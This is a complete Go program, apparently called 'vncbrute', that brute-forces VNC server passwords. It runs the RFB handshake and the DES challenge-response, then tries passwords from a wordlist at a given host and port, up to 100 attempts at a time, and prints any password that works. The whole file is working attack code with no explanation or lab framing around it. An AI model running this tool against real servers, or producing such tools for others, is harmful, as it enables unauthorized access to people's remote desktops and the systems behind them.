package main

import (
    "bufio"
    "context"
    "crypto/des"
    "flag"
    "fmt"
    "log"
    "net"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

// FlipBits reverses the bits in a byte for VNC DES key adjustment
func flipBits(b byte) byte {
    var result byte
    for i := 0; i < 8; i++ {
        if (b & (1 << i)) != 0 {
            result |= 1 << (7 - i)
        }
    }
    return result
}

// AdjustPassword flips the bits in each byte of the password for VNC DES encryption
func adjustPassword(password string) []byte {
    adjusted := make([]byte, 8)
    for i := 0; i < len(password) && i < 8; i++ {
        adjusted[i] = flipBits(password[i])
    }
    return adjusted
}

// Encrypts the challenge using the adjusted password (VNC DES encryption)
func encryptVNC(challenge []byte, password string) []byte {
    adjustedPassword := adjustPassword(password)
    desCipher, err := des.NewCipher(adjustedPassword)
    if err != nil {
        log.Fatalf("Failed to create DES cipher: %v", err)
    }

    encryptedChallenge := make([]byte, 16)
    desCipher.Encrypt(encryptedChallenge[:8], challenge[:8])
    desCipher.Encrypt(encryptedChallenge[8:], challenge[8:])

    return encryptedChallenge
}

// Attempt to authenticate with the VNC server using a password
func attemptVNCConnection(ctx context.Context, host, port, password string, timeout time.Duration) bool {
    dialer := net.Dialer{
        Timeout: timeout,
    }

    conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
    if err != nil {
        return false
    }
    defer conn.Close()

    // Read server protocol version
    versionBuf := make([]byte, 12)
    if _, err := conn.Read(versionBuf); err != nil {
        return false
    }

    // Send client protocol version
    if _, err := conn.Write(versionBuf); err != nil {
        return false
    }

    // Read security types length
    secTypesLen := make([]byte, 1)
    if _, err := conn.Read(secTypesLen); err != nil {
        return false
    }

    // Read supported security types
    secTypes := make([]byte, secTypesLen[0])
    if _, err := conn.Read(secTypes); err != nil {
        return false
    }

    // Choose VNC authentication (0x02)
    if !contains(secTypes, 0x02) {
        return false
    }

    if _, err := conn.Write([]byte{0x02}); err != nil {
        return false
    }

    // Read the challenge from the server
    challenge := make([]byte, 16)
    if _, err := conn.Read(challenge); err != nil {
        return false
    }

    // Encrypt the challenge using the password and send it back
    encryptedChallenge := encryptVNC(challenge, password)
    if _, err := conn.Write(encryptedChallenge); err != nil {
        return false
    }

    // Read the response (0x00 = OK, 0x01 = failed)
    response := make([]byte, 4)
    if _, err := conn.Read(response); err != nil {
        return false
    }

    return response[3] == 0x00
}

// Check if a byte is present in a slice
func contains(slice []byte, item byte) bool {
    for _, v := range slice {
        if v == item {
            return true
        }
    }
    return false
}

// Read passwords concurrently using a buffered channel
func readPasswords(ctx context.Context, filename string, ch chan<- string, wg *sync.WaitGroup) {
    defer wg.Done()
    file, err := os.Open(filename)
    if err != nil {
        log.Fatalf("Failed to read password file: %v\n", err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        password := strings.TrimSpace(scanner.Text())
        if password == "" {
            continue
        }
        select {
        case <-ctx.Done():
            return
        case ch <- password:
        }
    }
    close(ch)
}

// Display a progress bar with concurrent updates on the same line
func displayProgress(ctx context.Context, current, total *int64, wg *sync.WaitGroup) {
    defer wg.Done()
    startTime := time.Now()
    barWidth := 50

    for {
        select {
        case <-ctx.Done():
            return
        default:
        }

        currentVal := atomic.LoadInt64(current)
        totalVal := atomic.LoadInt64(total)

        // Prevent division by zero
        if totalVal == 0 {
            time.Sleep(500 * time.Millisecond)
            continue
        }

        percentage := float64(currentVal) / float64(totalVal) * 100

        elapsedDuration := time.Since(startTime)
        var remaining time.Duration
        if currentVal > 0 {
            remaining = time.Duration(float64(elapsedDuration)/float64(currentVal) * float64(totalVal-currentVal))
        } else {
            remaining = 0
        }

        // Generate the progress bar
        progress := int(float64(currentVal) / float64(totalVal) * float64(barWidth))
        if progress > barWidth {
            progress = barWidth
        }
        bar := strings.Repeat("=", progress) + strings.Repeat(" ", barWidth-progress)

        // Print the progress information and progress bar on the same line
        fmt.Printf("\r\033[KProgress: %.2f%% (%d/%d) - Elapsed: %s - Remaining: %s [%s]",
            percentage, currentVal, totalVal, formatDuration(elapsedDuration), formatDuration(remaining), bar)

        time.Sleep(500 * time.Millisecond)
    }
}

// FormatDuration formats the duration into days, hours, minutes, and seconds.
func formatDuration(d time.Duration) string {
    if d < 0 {
        d = -d
    }
    days := d / (24 * time.Hour)
    d -= days * 24 * time.Hour
    hours := d / time.Hour
    d -= hours * time.Hour
    minutes := d / time.Minute
    d -= minutes * time.Minute
    seconds := d / time.Second

    return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
}

func main() {
    concurrency := flag.Int("c", 100, "Number of concurrent attempts")
    timeout := flag.Duration("t", 3*time.Second, "Connection timeout duration")
    flag.Parse()

    if len(flag.Args()) < 3 {
        fmt.Println("Usage: vncbrute [-c <concurrency>] [-t <timeout>] <host> <port> <password_file>")
        return
    }

    host := flag.Arg(0)
    port := flag.Arg(1)
    passwordFile := flag.Arg(2)

    passwordCh := make(chan string, *concurrency)
    var total, current int64
    var found int32

    // Count total passwords
    passwords, err := os.Open(passwordFile)
    if err != nil {
        fmt.Printf("Failed to read password file: %v\n", err)
        return
    }
    totalScanner := bufio.NewScanner(passwords)
    for totalScanner.Scan() {
        atomic.AddInt64(&total, 1)
    }
    passwords.Close()

    ctx, cancel := context.WithCancel(context.Background())
    var wg sync.WaitGroup

    // Start the progress display
    wg.Add(1)
    go displayProgress(ctx, &current, &total, &wg)

    // Start the readPasswords goroutine
    wg.Add(1)
    go readPasswords(ctx, passwordFile, passwordCh, &wg)

    // Start worker goroutines
    for i := 0; i < *concurrency; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for {
                select {
                case <-ctx.Done():
                    return
                case password, ok := <-passwordCh:
                    if !ok {
                        return
                    }
                    if atomic.LoadInt32(&found) == 1 {
                        return
                    }
                    if attemptVNCConnection(ctx, host, port, password, *timeout) {
                        if atomic.CompareAndSwapInt32(&found, 0, 1) {
                            fmt.Printf("\n[+] Password found: %s\n", password)
                            cancel()
                            os.Exit(0) // Force exit immediately
                        }
                        return
                    }
                    atomic.AddInt64(&current, 1)
                }
            }
        }()
    }

    // Wait for all goroutines to finish
    wg.Wait()

    if atomic.LoadInt32(&found) == 0 {
        fmt.Println("\n[-] No valid password found.")
    }
}

